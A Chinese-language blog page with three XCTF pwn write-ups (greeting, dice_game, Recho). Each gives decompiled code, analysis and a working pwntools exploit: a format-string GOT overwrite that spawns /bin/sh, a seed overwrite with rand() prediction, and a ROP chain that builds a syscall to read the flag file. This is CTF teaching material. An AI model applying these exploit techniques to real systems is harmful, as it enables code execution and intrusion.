<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords" content=""><meta name="author" content="Soinux"><meta name="copyright" content="Soinux"><title>Soinux's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Soinux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">5</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">2</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.baidu.com" target="_blank" rel="noopener">BestFriend</a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Soinux's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Soinux's Blog</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/03/greeting/">【XCTF攻防世界】greeting-150</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-03</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;greeting&#x2F;greeting&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+5Ch] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please tell me your name... "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !getnline(&amp;v5, <span class="number">64</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Don't ignore me ;( "</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>存在格式化字符串漏洞,要注意%s前面已经有18字节的数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048490 _system         proc near               ; CODE XREF: nao+37↓p</span><br></pre></td></tr></table></figure>

<ul>
<li>程序导入了system函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __cdecl <span class="title">getnline</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fgets(s, n, <span class="built_in">stdin</span>);</span><br><span class="line">  v3 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>getnline函数中调用了strlen函数，利用格式化字符串漏洞可以将strlen got 表项改为system_plt </li>
</ul>
<p>利用格式化字符串漏洞可以将.fini_array 段内容改为main函数起始位置，实现程序的无限循环，具体原理可以看<a href="https://bbs.ichunqiu.com/thread-43624-1-1.html" target="_blank" rel="noopener">这篇文章</a></p>
<blockquote>
<p>程序在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
</blockquote>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#sh=remote(host='111.198.29.45', port=44521)</span></span><br><span class="line">sh = process(<span class="string">'./greeting'</span>)</span><br><span class="line">e = ELF(<span class="string">'./greeting'</span>)</span><br><span class="line"></span><br><span class="line">system_plt = e.plt[<span class="string">'system'</span>]</span><br><span class="line">strlen_got = e.got[<span class="string">'strlen'</span>]</span><br><span class="line"><span class="comment">#print(hex(system_plt))</span></span><br><span class="line">fini_array = <span class="number">0x08049934</span></span><br><span class="line">main = <span class="number">0x080484f0</span></span><br><span class="line"><span class="comment">#进行对齐</span></span><br><span class="line">payload = <span class="string">b'aa'</span></span><br><span class="line"><span class="comment">#0x804 -&gt; strlen_got+2, 0x804 -&gt; fini_array+2</span></span><br><span class="line"><span class="comment">#0x8490 -&gt; strlen_got, 0x84f0 -&gt; fini_array</span></span><br><span class="line">payload += flat([strlen_got+<span class="number">2</span>, fini_array+<span class="number">2</span>,strlen_got, fini_array])</span><br><span class="line"><span class="comment">#0x804 - 4 * 4 - 2 - 18 = 2016</span></span><br><span class="line"><span class="comment">#0x8490 - 0x804 = 31884</span></span><br><span class="line">payload += <span class="string">'%2016c%12$hn%13$hn%31884c%14$hn%96c%15$hn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/02/dice-game/">【XCTF攻防世界】 dice_game</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><blockquote>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/home/soinux/ctf/xctf/pwn/dice_game/dice_game'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">55</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome, let me know your name: "</span>, a2);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt;= <span class="number">49</span> )</span><br><span class="line">    buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hi, %s. Let's play a game.\n"</span>, buf);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Game %d/50\n"</span>, v8);</span><br><span class="line">    v5 = sub_A20();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">50</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print_flag((__int64)buf);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Bye bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">guess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  __int16 v2; <span class="comment">// [rsp+Eh] [rbp-2h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me the point(1~6): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; <span class="number">6</span> || v2 &lt;= <span class="number">0</span> || v2 &gt; <span class="number">6</span> )</span><br><span class="line">      _assert_fail(<span class="string">"(point&gt;=1 &amp;&amp; point&lt;=6) &amp;&amp; (sPoint&gt;=1 &amp;&amp; sPoint&lt;=6)"</span>, <span class="string">"dice_game.c"</span>, <span class="number">0x18</span>u, <span class="string">"dice_game"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 == v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You win."</span>);</span><br><span class="line">      result = <span class="number">1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You lost."</span>);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid value!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路很清晰，覆盖seed为固定值，然后猜对50次，执行print_flag，就能得到flag，可以用Python ctypes模块模拟c库的随机数生成函数。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = remote(host='111.198.29.45', port=50672)</span></span><br><span class="line">sh = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">  num = libc.rand() % <span class="number">6</span> + <span class="number">1</span></span><br><span class="line">  sh.sendline(str(num))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/02/Recho/">【XCTF攻防世界】 Recho</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/CTF/pwn/">pwn</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/pwn/">pwn</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;soinux&#x2F;ctf&#x2F;xctf&#x2F;pwn&#x2F;recho&#x2F;recho&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Welcome to Recho server!\n"</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = atoi(&amp;nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">15</span> )</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">    v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, v7);</span><br><span class="line">    buf[v6] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然可以栈溢出， 不过没法多次leak，DynELF应该是不用想了，F12 + shift 一下， 发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000601058 flag            db &#39;flag&#39;,0</span><br></pre></td></tr></table></figure>

<p>程序自身提供给我们’flag’, 那应该是利用open + read + wirte 直接得到flag,  但程序没有导入open函数，不过程序导入了alarm函数， 因为系统调用一般是通过syscall实现，alarm函数内部一定会有syscall，那我们就可以将alarm的got表值进行偏移， 构造syscall<br>动态调试发现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fffff0fc200 &lt;alarm&gt;:      mov    eax,0x25 </span><br><span class="line">0x7fffff0fc205 &lt;alarm+5&gt;:    syscall</span><br></pre></td></tr></table></figure>
<p>alarm got表值加5就可以构造出syscall， 然后就可以调用open获得flag文件描述符， 这里需要注意：</p>
<blockquote>
<p>open函数返回的文件描述符fd一定是未使用的最小的文件描述符。</p>
</blockquote>
<p>所以，除去已经默认打开的三个文件，这次返回的文件描述符应该是3</p>
<p>利用ROPgadget得到的一些gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040070d : add byte ptr [rdi], al ; ret</span><br><span class="line">0x00000000004006fc : pop rax ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004006fe : pop rdx ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">sh = process(<span class="string">'./recho'</span>)</span><br><span class="line"><span class="comment">#sh = remote(host='111.198.29.45', port=43098)</span></span><br><span class="line">e = ELF(<span class="string">'./recho'</span>)</span><br><span class="line">pop_rax = <span class="number">0x4006fc</span></span><br><span class="line">pop_rdi = <span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4008a1</span></span><br><span class="line">pop_rdx = <span class="number">0x4006fe</span></span><br><span class="line">add_rdi = <span class="number">0x40070d</span></span><br><span class="line">flag = <span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span> * <span class="number">0x38</span></span><br><span class="line"><span class="comment">#构造syscall</span></span><br><span class="line">payload += p64(pop_rdi) + p64(e.got[<span class="string">'alarm'</span>]) + p64(pop_rax) + p64(<span class="number">5</span>) + p64(ad  d_rdi)</span><br><span class="line"><span class="comment">#调用利用syscall调用open</span></span><br><span class="line">payload += p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(flag) + p64(pop_rsi_r15)   + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) +  p64(e.plt[<span class="string">'alarm'</span>])</span><br><span class="line"><span class="comment">#调用read</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi_r15) + p64(e.bss(<span class="number">0</span>)) + p64(<span class="number">0</span>) +   p64(pop_rdx) + p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">'read'</span>])</span><br><span class="line"><span class="comment">#调用write</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi_r15) + p64(e.bss(<span class="number">0</span>)) + p64(<span class="number">0</span>) +   p64(pop_rdx) +p64(<span class="number">0x100</span>) + p64(e.plt[<span class="string">'write'</span>])</span><br><span class="line">sh.sendline(str(<span class="number">1000</span>))</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.shutdown()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>pwntools字符串打包模块有函数flat， 可以简化payload构造<br>以下代码出自某 <a href="https://wanghaichen.com/index.php/archives/recho.html" target="_blank" rel="noopener">大佬</a>的博客</p>
<blockquote>
<p> payload = flat([‘t3ls’.ljust(0x38, ‘\x00’)])<br>    payload += flat([pop_rdi, e.got[‘alarm’], pop_rax, 5, add_rdi_al])<br>    payload += flat([pop_rdi, flag, pop_rsi_r15, 0, 0, pop_rdx, 0, pop_rax, 2, syscall])<br>    payload += flat([pop_rdi, 3, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt[‘read’]])<br>    payload += flat([pop_rdi, 1, pop_rsi_r15, e.bss(0), 0, pop_rdx, 64, e.plt[‘write’]])</p>
</blockquote>
